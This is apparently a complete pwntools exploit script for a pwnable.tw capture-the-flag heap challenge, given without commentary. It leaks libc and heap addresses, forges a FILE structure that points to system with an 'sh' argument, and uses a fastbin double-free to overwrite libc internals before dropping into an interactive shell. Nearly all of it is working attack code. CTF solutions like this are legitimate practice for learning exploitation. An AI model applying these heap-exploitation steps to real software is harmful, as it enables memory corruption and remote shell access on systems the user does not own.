from pwn import *
s = remote('chall.pwnable.tw',10203)
def new(length,name,color):
  s.recvuntil('choice :')
  s.send('1\n')
  s.recvuntil('name :')
  s.send(str(length)+'\n')
  s.recvuntil('flower :')
  s.send(name)
  s.recvuntil('flower :')
  s.send(color)
def remove(index):
  s.recvuntil('choice :')
  s.send('3\n')
  s.recvuntil('garden:')
  s.send(str(index)+'\n')
#STAGE 1
new(1024,'AAAA','AAAA\n')
new(1024,'BBBB','BBBB\n')
new(1024,'CCCC','CCCC\n')
remove(0)
s.recvuntil('choice :')
s.send('4\n')
s.recvuntil('Done!')
new(1024,'B'*8,'1234\n')
s.recvuntil('choice :')
s.send('2\n')
main_arena = u64(s.recvuntil('C')[-2-6:-2]+'\x00\x00')-88
#main_arena -- 03C3B20 / 03be760 
libc_base = main_arena - 0x3C3B20#0x3be760
log.info('main_arena : %x'%main_arena)
log.info('libc_base : %x'%libc_base)
#STAGE 2
remove(0)
remove(1)
remove(2)
new(1024,'A'*16,p64(libc_base+0x045390)+'\n')
s.recvuntil('choice :')
s.send('2\n')
heap = u64(s.recvuntil('C')[-2-6:-2]+'\x00\x00') - 0x1040
magic = heap + 0x1630
log.info('heap : %x'%heap)
#STAGE 3
new(0x68,'AAAA','AAAA\n')
new(0x68,'CCCC','CCCC\n')
dat = p64(0x6873)
dat += p64(0)
dat += p64(libc_base+0x3c46a3)*7
dat += p64(0)*4
dat += p64(libc_base+0x3c38e0)
dat += p64(1)
dat += p64(0xffffffffffffffff)
dat += p64(0x000000000a000000)
dat += p64(libc_base+0x3c5780)
dat += p64(0xffffffffffffffff)
dat += p64(0)
dat += p64(libc_base+0x3c37a0)
dat += p64(0)*3
dat += p64(0x00000000ffffffff)
dat += p64(0)*2
dat += p64(heap+0x14a0-0x38)
dat += p64(libc_base+0x3c4540)
new(0x100,dat,'1234\n')
remove(4)
remove(5)
remove(4)
fake_chunk = libc_base + 0x3c46b5+8
log.info("fake_chunk : %x"%fake_chunk)
new(0x68,p64(fake_chunk),'AAAA\n')
new(0x68,'AAAA','CCCC\n')
new(0x68,p64(fake_chunk),'BBBB\n')
s.recvuntil('choice :')
s.send('1\n')
s.recvuntil('name :')
s.send(str(0x68)+'\n')
s.recvuntil('flower :')
s.send('A'*0x3b+p64(magic))
s.interactive()
